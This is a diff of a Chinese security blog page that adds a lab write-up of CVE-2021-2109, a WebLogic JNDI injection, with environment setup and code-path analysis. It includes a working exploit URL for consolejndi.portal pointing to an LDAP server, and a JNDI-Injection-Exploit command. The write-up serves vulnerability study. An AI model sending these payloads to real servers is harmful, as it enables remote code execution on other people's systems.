@@ -11,7 +11,7 @@
   <meta itemprop="description" content="description is here">
   <meta itemprop="datePublished" content="2025-05-11T14:18:30+08:00">
   <meta itemprop="dateModified" content="2025-05-11T14:18:30+08:00">
-  <meta itemprop="wordCount" content="601">
+  <meta itemprop="wordCount" content="553">
   <meta itemprop="keywords" content="Java"><meta property="og:url" content="http://localhost:1313/posts/0846c48/">
   <meta property="og:site_name" content="6s6&#39;s blog">
   <meta property="og:title" content="Weblogic学习(2)">
@@ -40,7 +40,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http:\/\/localhost:1313\/posts\/0846c48\/"
-    },"genre": "posts","keywords": "Java","wordcount":  601 ,
+    },"genre": "posts","keywords": "Java","wordcount":  553 ,
     "url": "http:\/\/localhost:1313\/posts\/0846c48\/","datePublished": "2025-05-11T14:18:30+08:00","dateModified": "2025-05-11T14:18:30+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -116,7 +116,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Weblogic学习(2)</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://bu.dusays.com/2024/12/26/676d23907280d.jpg" alt="6s6" data-title="6s6" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;6s6</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/java/" class="post-category" title="分类 - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="发布于 2025-05-11 14:18:30"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-11">2025-05-11</time></span>&nbsp;<span title="601 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625180730436.jpg" alt="6s6" data-title="6s6" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;6s6</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/java/" class="post-category" title="分类 - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="发布于 2025-05-11 14:18:30"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-11">2025-05-11</time></span>&nbsp;<span title="553 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -125,38 +125,6 @@
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li><a href="#前言">前言</a></li>
-    <li><a href="#弱口令-getshell">弱口令 getshell</a>
-      <ul>
-        <li><a href="#弱口令">弱口令</a></li>
-        <li><a href="#文件上传">文件上传</a></li>
-      </ul>
-    </li>
-    <li><a href="#cve-2020-14882cve-2020-14883-未授权-rce">CVE-2020-14882/CVE-2020-14883 未授权 RCE</a>
-      <ul>
-        <li><a href="#影响版本">影响版本</a></li>
-        <li><a href="#cve-2020-14883">CVE-2020-14883</a></li>
-        <li><a href="#cve-2020-14882">CVE-2020-14882</a>
-          <ul>
-            <li><a href="#方法一">方法一</a></li>
-            <li><a href="#方法二">方法二</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-    <li><a href="#cve-2014-4210-ssrf">CVE-2014-4210 SSRF</a>
-      <ul>
-        <li><a href="#影响版本-1">影响版本</a></li>
-        <li><a href="#漏洞复现">漏洞复现</a></li>
-      </ul>
-    </li>
-    <li><a href="#cve-2018-2894-任意文件上传">CVE-2018-2894 任意文件上传</a>
-      <ul>
-        <li><a href="#影响版本-2">影响版本</a></li>
-        <li><a href="#漏洞复现-1">漏洞复现</a></li>
-        <li><a href="#小结">小结</a></li>
-        <li><a href="#参考">参考</a></li>
-      </ul>
-    </li>
     <li><a href="#cve-2021-2109-weblogic-jndi-注入">CVE-2021-2109 WebLogic JNDI 注入</a>
       <ul>
         <li><a href="#环境搭建">环境搭建</a></li>
@@ -165,6 +133,38 @@
             <li><a href="#利用前提">利用前提</a></li>
             <li><a href="#漏洞分析-1">漏洞分析</a></li>
             <li><a href="#漏洞修复">漏洞修复</a></li>
+          </ul>
+        </li>
+        <li><a href="#小结">小结</a></li>
+        <li><a href="#参考">参考</a></li>
+        <li><a href="#弱口令-getshell">弱口令 getshell</a>
+          <ul>
+            <li><a href="#弱口令">弱口令</a></li>
+            <li><a href="#文件上传">文件上传</a></li>
+          </ul>
+        </li>
+        <li><a href="#cve-2020-14882cve-2020-14883-未授权-rce">CVE-2020-14882/CVE-2020-14883 未授权 RCE</a>
+          <ul>
+            <li><a href="#影响版本">影响版本</a></li>
+            <li><a href="#cve-2020-14883">CVE-2020-14883</a></li>
+            <li><a href="#cve-2020-14882">CVE-2020-14882</a>
+              <ul>
+                <li><a href="#方法一">方法一</a></li>
+                <li><a href="#方法二">方法二</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#cve-2014-4210-ssrf">CVE-2014-4210 SSRF</a>
+          <ul>
+            <li><a href="#影响版本-1">影响版本</a></li>
+            <li><a href="#漏洞复现">漏洞复现</a></li>
+          </ul>
+        </li>
+        <li><a href="#cve-2018-2894-任意文件上传">CVE-2018-2894 任意文件上传</a>
+          <ul>
+            <li><a href="#影响版本-2">影响版本</a></li>
+            <li><a href="#漏洞复现-1">漏洞复现</a></li>
           </ul>
         </li>
         <li><a href="#小结-1">小结</a></li>
@@ -179,15 +179,162 @@
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h2><p>相对于前面的反序列化洞，以下几个洞比较简单，就不多加分析了，主要看下怎么打</p>
-<h2 id="弱口令-getshell" class="heading-element"><span>弱口令 getshell</span>
+<h2 id="cve-2021-2109-weblogic-jndi-注入" class="heading-element"><span>CVE-2021-2109 WebLogic JNDI 注入</span>
+  <a href="#cve-2021-2109-weblogic-jndi-%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>参考T3反序列化的环境，需要多加一个 <code>\server\lib\consoleapp\webapp\WEB-INF\lib\console.jar</code> 到依赖中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞分析" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="利用前提" class="heading-element"><span>利用前提</span>
+  <a href="#%e5%88%a9%e7%94%a8%e5%89%8d%e6%8f%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>Oracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
+<p>这里要进入到 /console/consolejndi.portal 路由里才能打</p>
+<h4 id="漏洞分析-1" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>原理就是WebLogic 的 <code>/console/consolejndi.portal</code> 接口可以调用存在 JNDI 注入漏洞的 <code>com.bea.console.handles.JndiBindingHandle</code> 类，从而造成 RCE，所以要在进后台的前提下才能打</p>
+<p>这里用到的工具为：https://github.com/welk1n/JNDI-Injection-Exploit</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#34;touch /tmp/jndi_test&#34; -A 192.168.2.1</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508706.png" alt="image-20250506171207587" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508706.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508706.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508706.png?size=large 2x" data-title="image-20250506171207587" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>payload为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.2;1:1389/mezyww;AdminServer%22)</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508709.png" alt="image-20250506171326607" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508709.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508709.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508709.png?size=large 2x" data-title="image-20250506171326607" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里就是 <code>;</code> 而不是 <code>.</code></p>
+<p>看到 <code>\server\lib\consoleapp\webapp</code> 下的 <code>consolejndi.portal</code> ，就是我们刚才 payload 中访问的路由</p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508718.png" alt="image-20250506175245640" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508718.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508718.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508718.png?size=large 2x" data-title="image-20250506175245640" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>具体的处理逻辑在 <code>/PortalConfig/jndi/jndibinding.portlet</code></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508713.png" alt="image-20250506180515325" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508713.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508713.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508713.png?size=large 2x" data-title="image-20250506180515325" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以发现在 <code>com.bea.console.actions.jndi.JNDIBindingAction#execute</code> 中就是处理逻辑</p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508722.png" alt="image-20250506205421771" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508722.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508722.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508722.png?size=large 2x" data-title="image-20250506205421771" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>先获取 jndi 上下文然后就直接 lookup 了，现在先看下怎么控制 serverMBean 了，而一直往上追溯其赋值，大概可以用下面这个赋值链表示</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">JndiBindingHandle bindingHandle = (JndiBindingHandle)this.getHandleContext(actionForm, request, &#34;JNDIBinding&#34;);
+</span></span><span class="line"><span class="cl">-&gt;
+</span></span><span class="line"><span class="cl">String serverName = bindingHandle.getServer();
+</span></span><span class="line"><span class="cl">-&gt;
+</span></span><span class="line"><span class="cl">ServerMBean serverMBean = domainMBean.lookupServer(serverName);</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从 <code>domainMBean.lookupServer(serverName)</code> 开始分析，这里是动态代理调用，用的是 <code>weblogic.management.jmx.MBeanServerInvocationHandler#invoke</code></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508738.png" alt="image-20250506211514032" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508738.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508738.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175508738.png?size=large 2x" data-title="image-20250506211514032" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里 var2 就是要调用的方法 <code>weblogic.management.configuration.DomainMBean#lookupServer</code> ，var3 则是要传进去的参数，然后发现 var2 的实现类是 <code>weblogic.management.configuration.DomainMBeanImpl#lookupServer</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">ServerMBean</span><span class="w"> </span><span class="nf">lookupServer</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Iterator</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">((</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">_Servers</span><span class="p">).</span><span class="na">iterator</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ServerMBeanImpl</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">do</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">var2</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ServerMBeanImpl</span><span class="p">)</span><span class="n">var2</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">var3</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">var1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里 <code>this._Servers</code> 是一组服务器对象，会依次取出其中的实例并判断其 getName 返回的值是否为我们传进去的 var1</p>
+<p>我们肯定不能返回 null，所以我们必须要让传进去的 var1 等于其 getName 值，这里只有一个实例，其 getName 返回的值为 AdminServer</p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509260.png" alt="image-20250506213012236" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509260.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509260.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509260.png?size=large 2x" data-title="image-20250506213012236" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>因此我们传入的 var1 值为 AdminServer ，根据之前我们的赋值链可以发现 var1 就是 serverName，跟进下 getServer 方法会发现其值是可控的，会返回 getComponent 方法获得的数组中索引为 2 的值，这个方法待会分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    public String getServer() {
+</span></span><span class="line"><span class="cl">        return this.getComponent(2);
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>至此 <code>c != null</code> 已经可以满足，现在看看 jndi lookup 的地址怎么控制</p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509328.png" alt="image-20250506213900415" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509328.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509328.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509328.png?size=large 2x" data-title="image-20250506213900415" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进发现其两个 getter 方法都是调用的 ，而且都是用到 getComponent 方法返回的数组</p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509359.png" alt="image-20250506214010067" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509359.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509359.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509359.png?size=large 2x" data-title="image-20250506214010067" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>最后跟进到 <code>com.bea.console.handles.HandleImpl#getComponents()</code> ，这个方法也很简单，就是用 <code>;</code> 来分隔数组中的每个组件</p>
+<p>所以最后构造 payload 的时候就很清晰了，写三个组件，前两个是 jndi 的远程地址，最后一个为 AdminServer 就好了，用 <code>;</code> 分隔</p>
+<h4 id="漏洞修复" class="heading-element"><span>漏洞修复</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>加了个函数来判断传进 lookup 方法的值</p>
